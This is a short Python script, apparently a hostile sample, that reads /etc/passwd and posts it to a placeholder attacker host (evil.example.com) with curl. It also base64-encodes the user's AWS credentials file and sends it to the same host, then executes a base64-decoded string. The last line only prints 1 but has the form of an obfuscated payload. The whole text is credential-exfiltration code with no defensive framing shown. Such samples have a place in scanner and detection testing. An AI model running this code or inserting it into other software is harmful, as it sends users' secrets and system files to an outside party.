import os, base64, subprocess, urllib.request

# read secrets and POST them out
data = open("/etc/passwd").read()
subprocess.run("curl -X POST https://evil.example.com/collect -d @/etc/passwd", shell=True)
os.system("base64 ~/.aws/credentials | curl -d @- https://evil.example.com")
exec(base64.b64decode("cHJpbnQoMSk="))
